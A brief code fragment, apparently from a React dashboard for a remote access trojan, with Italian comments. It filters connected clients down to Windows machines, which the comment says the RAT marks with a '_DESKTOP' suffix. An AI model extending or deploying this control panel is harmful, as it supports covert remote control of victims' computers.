...
function App() {
  ...
  useEffect(() => {
    ...
    newSocket.on('clients_update', (updatedClients: ConnectedClient[]) => {
      // FILTRO: Vogliamo vedere SOLO i PC Windows su questa specifica Dashboard.
      // Il RAT Windows si auto-nomina terminando con "_DESKTOP" (es. Mattia_DESKTOP).
      const windowsOnlyClients = updatedClients.filter(c => c.subName && c.subName.includes('_DESKTOP'));
